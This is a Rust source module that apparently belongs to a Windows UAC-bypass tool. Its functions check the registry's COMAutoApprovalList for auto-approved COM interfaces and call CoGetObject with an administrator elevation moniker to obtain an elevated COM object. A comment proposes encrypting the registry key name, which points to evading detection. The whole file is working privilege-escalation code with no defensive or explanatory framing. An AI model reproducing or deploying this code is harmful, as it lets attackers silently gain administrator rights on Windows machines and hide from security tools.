use crate::global::*;
use crate::shared::*;

use anyhow::*;
use std::{
    ffi::c_void,
    mem::{size_of, zeroed},
    ptr::null_mut,
};
use winapi::shared::{
    guiddef::REFIID,
    minwindef::DWORD,
    ntdef::{HRESULT, LPWSTR},
    winerror::E_FAIL,
    wtypesbase::CLSCTX_LOCAL_SERVER,
};
mod bindings {
    ::windows::include_bindings!();
}
use bindings::Windows::Win32::Com::CoGetObject;
use bindings::Windows::Win32::Com::BIND_OPTS3;
use bindings::Windows::Win32::SystemServices::PWSTR;
use winreg::{enums::HKEY_LOCAL_MACHINE, RegKey};

#[allow(non_snake_case)]
pub fn alloc_elevated_object(
    lpObjectCLSID: impl Into<String>,
    riid: REFIID,
    dwClassContext: DWORD,
    ppv: *mut *mut c_void,
) -> Result<HRESULT> {
    unsafe {
        let lpObjectCLSID = lpObjectCLSID.into();
        let mut classContext = 0;
        let mut ElevatedObject: *mut c_void = null_mut();
        let mut bop = zeroed::<BIND_OPTS3>();

        if lpObjectCLSID.len() > 64 {
            return Ok(E_FAIL);
        }

        bop.__AnonymousBase_objidl_L8501_C36
            .__AnonymousBase_objidl_L8477_C36
            .cbStruct = size_of::<BIND_OPTS3>() as _;
        classContext = dwClassContext;

        if dwClassContext == 0 {
            classContext = CLSCTX_LOCAL_SERVER;
        }

        bop.__AnonymousBase_objidl_L8501_C36.dwClassContext = classContext;

        let mut moniker = cls_cat(lpObjectCLSID);

        let res = CoGetObject(
            PWSTR(moniker.as_mut_ptr()),
            &mut bop as *const _ as *mut _,
            riid as _,
            &mut ElevatedObject as *mut _ as *mut _,
        );

        if res.is_err() {
            dbg!(res.message());
            bail!("CoGetObject failed.");
        }

        if ElevatedObject.is_null() {
            dbg!(res.message());
            bail!("Could not get elevated object.");
        }

        *ppv = ElevatedObject;

        Ok(res.0 as _)
    }
}

// TODO: encrypted regkey name?
pub fn is_approved_interface(InterfaceName: LPWSTR) -> Result<bool> {
    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
    let var = hklm
        .open_subkey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\UAC\\COMAutoApprovalList")?;
    let val: u32 = var.get_value(from_wide_ptr(InterfaceName))?;

    if val == 0x1 {
        Ok(true)
    } else {
        dbg!(InterfaceName);
        bail!("InterfaceName not found in COMAutoApprovalList.")
    }
}

#[allow(non_snake_case)]
fn cls_cat(lpObjectCLSID: impl Into<String>) -> Vec<u16> {
    let lpObjectCLSID = lpObjectCLSID.into();
    e(&format!("{}{}", T_ELEVATION_MONIKER_ADMIN, lpObjectCLSID))
}
